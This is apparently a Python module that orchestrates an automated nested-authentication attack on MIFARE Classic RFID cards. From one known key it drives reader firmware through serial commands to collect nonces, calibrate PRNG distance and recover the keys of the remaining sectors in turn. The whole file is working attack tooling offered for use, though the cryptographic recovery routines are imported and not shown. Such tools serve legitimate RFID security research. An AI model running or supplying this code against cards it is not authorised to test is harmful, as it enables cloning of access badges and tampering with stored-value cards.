"""
Snowball attack orchestrator for MIFARE Classic.

Autonomously cascades through all 16 sectors using a conversational
firmware protocol. Each cracked key becomes leverage for the next.
"""

import queue
import time

from key_recovery import calibrate_nested_distance, nested_recover


class SnowballStats:
    """Track timing and progress for the live dashboard."""

    def __init__(self):
        self.start_time = 0.0
        self.sectors_cracked = 0
        self.sectors_failed = 0
        self.total_nonces = 0
        self.total_retries = 0
        self.current_phase = "idle"
        self.current_nonce_count = 0
        self.last_key_found = None
        self.per_sector_times = []


class SnowballOrchestrator:
    """Autonomous cascading key recovery for all card sectors."""

    # Tuning constants
    MIN_NONCES_FOR_RECOVERY = 2
    MAX_NONCES_PER_TARGET = 10
    MAX_RETRIES_PER_NONCE = 20
    MAX_RECOVERY_ATTEMPTS = 3

    def __init__(self, serial_handler, uid: int):
        self.serial = serial_handler
        self.uid = uid
        self.state = "idle"
        self.known_keys: dict[int, tuple[bytes, str]] = {}
        self.target_queue: list[int] = []
        self.current_target: int | None = None
        self.current_source: int | None = None
        self.nonce_pairs: list[tuple[int, int]] = []
        self.calibrated_distance: int | None = None
        self.result_queue: queue.Queue = queue.Queue()
        self.stats = SnowballStats()
        self._retry_count = 0
        self._recovery_attempts = 0
        self._sector_start_time = 0.0
        # Calibration state
        self._calib_source: int | None = None
        self._calib_target: int | None = None
        self._calib_key: bytes | None = None
        self._calib_key_type: str | None = None
        self._calib_nonces: list[tuple[int, int]] = []

    def start(self, seed_sector: int, seed_key: bytes, seed_key_type: str):
        """Begin snowball from a known key."""
        self.known_keys[seed_sector] = (seed_key, seed_key_type)
        self.target_queue = [s for s in range(16) if s != seed_sector]
        self.stats = SnowballStats()
        self.stats.start_time = time.monotonic()
        self.state = "starting"
        self.serial.send_command("C")
        self.result_queue.put({
            "event": "snowball_started",
            "seed_sector": seed_sector,
            "total_unknown": len(self.target_queue),
        })

    def stop(self):
        """Abort the snowball attack."""
        self._send("NX")
        self.state = "idle"
        self.stats.current_phase = "stopped"
        self.result_queue.put({
            "event": "snowball_stopped",
            "sectors_cracked": self.stats.sectors_cracked,
            "keys": dict(self.known_keys),
        })

    def feed(self, msg: dict):
        """Process a parsed serial message, advance state machine."""
        msg_type = msg.get("type")

        if self.state == "starting":
            if msg_type == "OK" and msg.get("message") == "CONV_START":
                self._begin_next_sector()
            return

        if self.state == "calibrating":
            self._handle_calibrating(msg)
        elif self.state == "collecting":
            self._handle_collecting(msg)

    def _send(self, cmd):
        """Send a newline-terminated conversational command."""
        self.serial.send_conv_command(cmd)

    def _pick_next_target(self) -> int | None:
        """Pick the next sector to attack. Prefer adjacent to known sectors."""
        if not self.target_queue:
            return None
        best = None
        best_dist = 999
        for t in self.target_queue:
            for k in self.known_keys:
                d = abs(t - k)
                if d < best_dist:
                    best_dist = d
                    best = t
        return best

    def _pick_best_source(self, target: int) -> int:
        """Pick the known sector closest to the target."""
        return min(self.known_keys.keys(), key=lambda k: abs(k - target))

    def _find_calib_target(self, source: int) -> int | None:
        """Find a second known sector to calibrate against (not source itself)."""
        for s in self.known_keys:
            if s != source:
                return s
        return None

    def _begin_next_sector(self):
        """Pick a target and start calibration."""
        target = self._pick_next_target()
        if target is None:
            self._finish_snowball()
            return

        source = self._pick_best_source(target)
        calib_target = self._find_calib_target(source)

        self.current_target = target
        self.current_source = source
        self.nonce_pairs = []
        self._retry_count = 0
        self._recovery_attempts = 0
        self._sector_start_time = time.monotonic()
        self.stats.current_nonce_count = 0

        if calib_target is not None:
            # Calibrate: auth to source, probe calib_target
            self._calib_source = source
            self._calib_target = calib_target
            key, kt = self.known_keys[source]
            self._calib_key = key
            self._calib_key_type = kt
            self._calib_nonces = []
            self.state = "calibrating"
            self.stats.current_phase = "calibrating"
            self.result_queue.put({
                "event": "sector_calibrating",
                "source": source,
                "target": target,
            })
            block = source * 4
            key_hex = key.hex().upper()
            self._send(f"NA:{block:02X}:{key_hex}:{kt}")
        else:
            # Only one known sector — skip calibration, use default distance
            self.calibrated_distance = 160
            self._begin_collection()

    def _begin_collection(self):
        """Start collecting nonces for the current target."""
        self.state = "collecting"
        self.stats.current_phase = "collecting"
        self._retry_count = 0
        self.result_queue.put({
            "event": "sector_collecting",
            "target": self.current_target,
            "nonce_count": 0,
        })
        # Auth to source sector
        source = self.current_source
        key, kt = self.known_keys[source]
        block = source * 4
        key_hex = key.hex().upper()
        self._send(f"NA:{block:02X}:{key_hex}:{kt}")

    def _handle_calibrating(self, msg):
        """Handle messages during calibration phase."""
        msg_type = msg.get("type")

        if msg_type == "NA":
            if msg.get("subtype") == "OK":
                calib_block = self._calib_target * 4
                self._send(f"NP:{calib_block:02X}")
            elif msg.get("subtype") in ("FAIL", "ERR"):
                self._retry_count += 1
                if self._retry_count < 5:
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("auth_failed")

        elif msg_type == "NP":
            if msg.get("subtype") == "NT":
                nt_known = int(msg["nt_known"], 16)
                nt_target = int(msg["nt_target"], 16)
                self._calib_nonces.append((nt_known, nt_target))

                if len(self._calib_nonces) >= 3:
                    self._finish_calibration()
                else:
                    self._retry_count = 0
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")

            elif msg.get("subtype") == "RETRY":
                self.stats.total_retries += 1
                self._retry_count += 1
                if self._retry_count < self.MAX_RETRIES_PER_NONCE:
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("calibration_timeout")

    def _finish_calibration(self):
        """Compute PRNG distance from calibration nonces."""
        distances = []
        for nt_k, nt_t in self._calib_nonces:
            d = calibrate_nested_distance(
                self.uid, nt_k, nt_t, self._calib_key, max_dist=65536
            )
            if d is not None:
                distances.append(d)

        if not distances:
            self._sector_failed("calibration_no_distance")
            return

        self.calibrated_distance = max(set(distances), key=distances.count)
        self.result_queue.put({
            "event": "sector_calibrated",
            "distance": self.calibrated_distance,
            "samples": len(distances),
        })
        self._begin_collection()

    def _handle_collecting(self, msg):
        """Handle messages during nonce collection phase."""
        msg_type = msg.get("type")

        if msg_type == "NA":
            if msg.get("subtype") == "OK":
                target_block = self.current_target * 4
                self._send(f"NP:{target_block:02X}")
            elif msg.get("subtype") in ("FAIL", "ERR"):
                self._retry_count += 1
                if self._retry_count < 5:
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("auth_failed")

        elif msg_type == "NP":
            if msg.get("subtype") == "NT":
                nt_known = int(msg["nt_known"], 16)
                nt_target = int(msg["nt_target"], 16)
                self.nonce_pairs.append((nt_known, nt_target))
                self.stats.total_nonces += 1
                self.stats.current_nonce_count = len(self.nonce_pairs)
                self._retry_count = 0

                self.result_queue.put({
                    "event": "sector_collecting",
                    "target": self.current_target,
                    "nonce_count": len(self.nonce_pairs),
                })

                if len(self.nonce_pairs) >= self.MIN_NONCES_FOR_RECOVERY:
                    self._attempt_recovery()
                else:
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")

            elif msg.get("subtype") == "RETRY":
                self.stats.total_retries += 1
                self._retry_count += 1
                if self._retry_count < self.MAX_RETRIES_PER_NONCE:
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("collection_timeout")

    def _attempt_recovery(self):
        """Try to recover the key from collected nonces."""
        self._recovery_attempts += 1
        self.stats.current_phase = "recovering"
        self.result_queue.put({
            "event": "sector_recovering",
            "target": self.current_target,
            "nonce_count": len(self.nonce_pairs),
        })

        candidates = nested_recover(
            self.uid, self.calibrated_distance, self.nonce_pairs
        )

        if candidates:
            key = candidates[0]
            elapsed = time.monotonic() - self._sector_start_time
            sector = self.current_target

            self.known_keys[sector] = (key, "A")
            if sector in self.target_queue:
                self.target_queue.remove(sector)

            self.stats.sectors_cracked += 1
            self.stats.last_key_found = key.hex().upper()
            self.stats.per_sector_times.append(elapsed)

            self.result_queue.put({
                "event": "sector_cracked",
                "sector": sector,
                "key": key.hex().upper(),
                "key_type": "A",
                "time_taken": elapsed,
            })

            self._begin_next_sector()
        else:
            if (len(self.nonce_pairs) < self.MAX_NONCES_PER_TARGET and
                    self._recovery_attempts < self.MAX_RECOVERY_ATTEMPTS):
                self.stats.current_phase = "collecting"
                source = self.current_source
                key, kt = self.known_keys[source]
                block = source * 4
                key_hex = key.hex().upper()
                self._send(f"NA:{block:02X}:{key_hex}:{kt}")
            else:
                self._sector_failed("recovery_failed")

    def _sector_failed(self, reason: str):
        """Mark current sector as failed and move on."""
        sector = self.current_target
        if sector in self.target_queue:
            self.target_queue.remove(sector)
        self.stats.sectors_failed += 1

        self.result_queue.put({
            "event": "sector_failed",
            "sector": sector,
            "reason": reason,
        })

        self._begin_next_sector()

    def _finish_snowball(self):
        """All targets attempted."""
        elapsed = time.monotonic() - self.stats.start_time
        self.state = "done"
        self.stats.current_phase = "done"

        self._send("NX")

        self.result_queue.put({
            "event": "snowball_complete",
            "total_cracked": self.stats.sectors_cracked,
            "total_failed": self.stats.sectors_failed,
            "total_time": elapsed,
            "keys": {s: (k.hex().upper(), kt)
                     for s, (k, kt) in self.known_keys.items()},
        })
